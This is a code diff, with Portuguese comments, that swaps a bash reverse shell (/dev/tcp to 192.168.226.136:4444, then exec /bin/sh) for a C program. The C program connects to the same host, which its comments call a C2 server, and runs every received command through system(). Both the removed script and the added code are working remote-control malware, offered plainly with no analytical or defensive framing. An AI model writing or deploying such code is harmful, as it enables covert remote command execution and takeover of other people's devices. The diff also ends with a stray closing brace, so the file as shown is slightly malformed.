@@ -1,22 +1,49 @@
-#!/bin/bash
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
 
-IP="192.168.226.136"
-PORT=4444
+int main() {
+    int sock;
+    struct sockaddr_in server;
+    const char *ip = "192.168.226.136"; // IP do servidor Linux C2
+    short port = 4444;
+    char buffer[1024];
+    int recv_size;
 
-exec 3<>/dev/tcp/$IP/$PORT
+    // Cria socket
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("Falha ao criar socket");
+        return 1;
+    }
 
-if [ $? -ne 0 ]; then
-    echo "Erro ao criar o socket"
-    exit 1
-fi
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+    server.sin_addr.s_addr = inet_addr(ip);
 
-# Redireciona stdin, stdout e stderr para o socket
-for i in 0 1 2; do
-    dup2 3 $i
-done
+    // Conecta ao servidor C2
+    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
+        perror("Falha ao conectar ao servidor");
+        close(sock);
+        return 1;
+    }
 
-# Executa /bin/sh
-exec /bin/sh
+    printf("Conectado ao servidor C2\n");
 
+    // Recebe comandos e os executa
+    while ((recv_size = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
+        buffer[recv_size] = '\0'; // Garante que o buffer seja uma string válida
+        printf("Comando recebido: %s\n", buffer);
+
+        // Executa o comando recebido no Linux (Termux)
+        system(buffer);
+
+        // Envia resposta para o servidor
+        send(sock, "Comando executado", strlen("Comando executado"), 0);
+    }
+
+    close(sock);
+    return 0;
 }
-
